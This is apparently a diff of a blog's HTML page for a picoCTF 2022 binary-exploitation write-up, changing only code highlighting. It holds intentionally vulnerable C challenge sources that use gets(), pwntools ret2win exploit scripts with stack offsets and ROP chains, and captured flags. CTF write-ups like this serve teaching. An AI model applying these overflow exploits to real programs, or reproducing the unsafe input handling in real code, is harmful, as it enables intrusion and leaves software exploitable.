+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  fgets(flag,FLAGSIZE_MAX,f);
+</span></span><span style="display:flex;"><span>  signal(SIGSEGV, sigsegv_handler); <span style="color:#75715e">// Set up signal handler
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  
+</span></span><span style="display:flex;"><span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Input: &#34;</span>);
+</span></span><span style="display:flex;"><span>  fflush(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf1[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>  gets(buf1); 
+</span></span><span style="display:flex;"><span>  vuln(buf1);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;The program will exit now</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It looks like it will print out the flag when it encounter SIGSEGV signal. So let&rsquo;s try it:</p>
 <p><img src="/img/picoctf2022-binexp/bof0.png" alt="IMG"></p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
@@ -375,116 +375,116 @@ int main(int argc, char **argv){
 <p>Control the return address
 Now we&rsquo;re cooking! You can overflow the buffer and return to the flag function in the program.</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-#include &#34;asm.h&#34;
-
-#define BUFSIZE 32
-#define FLAGSIZE 64
-
-void win() {
-  char buf[FLAGSIZE];
-  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging flag.\n&#34;);
-    exit(0);
-  }
-
-  fgets(buf,FLAGSIZE,f);
-  printf(buf);
-}
-
-void vuln(){
-  char buf[BUFSIZE];
-  gets(buf);
-
-  printf(&#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x\n&#34;, get_return_address());
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-
-  puts(&#34;Please enter your string: &#34;);
-  vuln();
-  return 0;
-}
-</code></pre><p>From the source code we can see it is a typical ret2win challenge, we just need to overflow the binary then return to the <code>win()</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;asm.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 32
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fgets(buf,FLAGSIZE,f);
+</span></span><span style="display:flex;"><span>  printf(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
+</span></span><span style="display:flex;"><span>  gets(buf);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;Okay, time to return... Fingers Crossed... Jumping to 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, get_return_address());
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
+</span></span><span style="display:flex;"><span>  vuln();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the source code we can see it is a typical ret2win challenge, we just need to overflow the binary then return to the <code>win()</code> function.</p>
 <p>I created a script using pwntools ROP object to easily control the return function:</p>
-<pre tabindex="0"><code>from pwn import *
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = &#39;&#39;&#39;
-init-pwndbg
-continue
-&#39;&#39;&#39;.format(**locals())
-
-
-# Set up pwntools for the correct architecture
-exe = &#39;./vuln&#39;
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = &#39;INFO&#39;
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-io = start()
-
-eip_offset = 44 
-info(&#39;located EIP offset at {a}&#39;.format(a=eip_offset))
-
-# Create ROP object
-rop = ROP(elf)
-# Call the hacked function
-rop.win()
-
-# Dump out the rop structure
-print(rop.dump())
-#pprint(rop.gadgets)
-
-# Get the raw bytes
-rop_chain = rop.chain() 
-
-# Build payload
-payload = flat({
-    eip_offset: rop_chain
-
-})
-
-# Save payload to file
-write(&#39;payload&#39;, payload)
-
-# Start a new process
-io = start()
-
-# PWN
-io.sendlineafter(b&#39;string:&#39;, payload)
-
-# Receive the flag
-io.interactive()
-</code></pre><p><img src="/img/picoctf2022-binexp/bof1.png" alt="IMG"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allows you to switch between local/GDB/remote from terminal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:  <span style="color:#75715e"># Set GDBscript below</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:  <span style="color:#75715e"># (&#39;server&#39;, &#39;port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  <span style="color:#75715e"># Run locally</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">init-pwndbg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This will automatically get context arch, bits, os etc</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change logging level to help with debugging (error/warning/info/debug)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;INFO&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eip_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">44</span> 
+</span></span><span style="display:flex;"><span>info(<span style="color:#e6db74">&#39;located EIP offset at </span><span style="color:#e6db74">{a}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(a<span style="color:#f92672">=</span>eip_offset))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create ROP object</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Call the hacked function</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>win()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Dump out the rop structure</span>
+</span></span><span style="display:flex;"><span>print(rop<span style="color:#f92672">.</span>dump())
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pprint(rop.gadgets)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the raw bytes</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>chain() 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    eip_offset: rop_chain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save payload to file</span>
+</span></span><span style="display:flex;"><span>write(<span style="color:#e6db74">&#39;payload&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start a new process</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PWN</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;string:&#39;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Receive the flag</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/picoctf2022-binexp/bof1.png" alt="IMG"></p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
 </code></pre><h2 id="buffer-overflow-2">buffer overflow 2</h2>
@@ -492,112 +492,112 @@ io.interactive()
 <p>Control the return address and arguments
 This time you&rsquo;ll need to control the arguments to the function you return to!</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre tabindex="0"><code>#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/types.h&gt;
-
-#define BUFSIZE 100
-#define FLAGSIZE 64
-
-void win(unsigned int arg1, unsigned int arg2) {
-  char buf[FLAGSIZE];
-  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
-  if (f == NULL) {
-    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
-                    &#34;own debugging flag.\n&#34;);
-    exit(0);
-  }
-
-  fgets(buf,FLAGSIZE,f);
-  if (arg1 != 0xCAFEF00D)
-    return;
-  if (arg2 != 0xF00DF00D)
-    return;
-  printf(buf);
-}
-
-void vuln(){
-  char buf[BUFSIZE];
-  gets(buf);
-  puts(buf);
-}
-
-int main(int argc, char **argv){
-
-  setvbuf(stdout, NULL, _IONBF, 0);
-  
-  gid_t gid = getegid();
-  setresgid(gid, gid, gid);
-
-  puts(&#34;Please enter your string: &#34;);
-  vuln();
-  return 0;
-}
-</code></pre><p>From the source code, we can see that this challenge is similar to <strong>buffer overflow 1</strong>. However, instead of just returning to <code>win()</code> function, we also need to pass the function arguments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFSIZE 100
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FLAGSIZE 64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> arg2) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[FLAGSIZE];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>f <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (f <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;%s %s&#34;</span>, <span style="color:#e6db74">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;own debugging flag.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  fgets(buf,FLAGSIZE,f);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xCAFEF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (arg2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  printf(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[BUFSIZE];
+</span></span><span style="display:flex;"><span>  gets(buf);
+</span></span><span style="display:flex;"><span>  puts(buf);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  gid_t gid <span style="color:#f92672">=</span> getegid();
+</span></span><span style="display:flex;"><span>  setresgid(gid, gid, gid);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;Please enter your string: &#34;</span>);
+</span></span><span style="display:flex;"><span>  vuln();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>From the source code, we can see that this challenge is similar to <strong>buffer overflow 1</strong>. However, instead of just returning to <code>win()</code> function, we also need to pass the function arguments.</p>
 <p>Again, this can be easily done using ROP object provided by pwntools:</p>
-<pre tabindex="0"><code>from pwn import *
-
-# Allows you to switch between local/GDB/remote from terminal
-def start(argv=[], *a, **kw):
-    if args.GDB:  # Set GDBscript below
-        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
-        return remote(sys.argv[1], sys.argv[2], *a, **kw)
-    else:  # Run locally
-        return process([exe] + argv, *a, **kw)
-
-# Specify your GDB script here for debugging
-# GDB will be launched if the exploit is run via e.g.
-# ./exploit.py GDB
-gdbscript = &#39;&#39;&#39;
-init-pwndbg
-continue
-&#39;&#39;&#39;.format(**locals())
-
-# Set up pwntools for the correct architecture
-exe = &#39;./vuln&#39;
-# This will automatically get context arch, bits, os etc
-elf = context.binary = ELF(exe, checksec=False)
-# Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = &#39;error&#39;
-
-# ===========================================================
-#                    EXPLOIT GOES HERE
-# ===========================================================
-
-io = start()
-
-eip_offset = 112 
-info(&#39;located EIP offset at {a}&#39;.format(a=eip_offset))
-
-# Create ROP object
-rop = ROP(elf)
-# Call the hacked function
-rop.win(0xCAFEF00D,  0xF00DF00D)
-
-# Get the raw bytes
-rop_chain = rop.chain() # Add exit : + p32(0x0804927e)
-
-# Build payload
-payload = flat({
-    eip_offset: rop_chain
-
-})
-
-# Save payload to file
-write(&#39;payload&#39;, payload)
-
-# Start a new process
-io = start()
-
-# PWN
-io.sendlineafter(b&#39;string: \n&#39;, payload)
-
-# Receive the flag
-io.interactive()
-</code></pre><p><img src="/img/picoctf2022-binexp/bof2.png" alt="IMG"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allows you to switch between local/GDB/remote from terminal</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:  <span style="color:#75715e"># Set GDBscript below</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>REMOTE:  <span style="color:#75715e"># (&#39;server&#39;, &#39;port&#39;)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  <span style="color:#75715e"># Run locally</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
+</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">init-pwndbg
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./vuln&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># This will automatically get context arch, bits, os etc</span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(exe, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Change logging level to help with debugging (error/warning/info/debug)</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;error&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===========================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eip_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span> 
+</span></span><span style="display:flex;"><span>info(<span style="color:#e6db74">&#39;located EIP offset at </span><span style="color:#e6db74">{a}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(a<span style="color:#f92672">=</span>eip_offset))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create ROP object</span>
+</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(elf)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Call the hacked function</span>
+</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>win(<span style="color:#ae81ff">0xCAFEF00D</span>,  <span style="color:#ae81ff">0xF00DF00D</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the raw bytes</span>
+</span></span><span style="display:flex;"><span>rop_chain <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>chain() <span style="color:#75715e"># Add exit : + p32(0x0804927e)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build payload</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat({
+</span></span><span style="display:flex;"><span>    eip_offset: rop_chain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save payload to file</span>
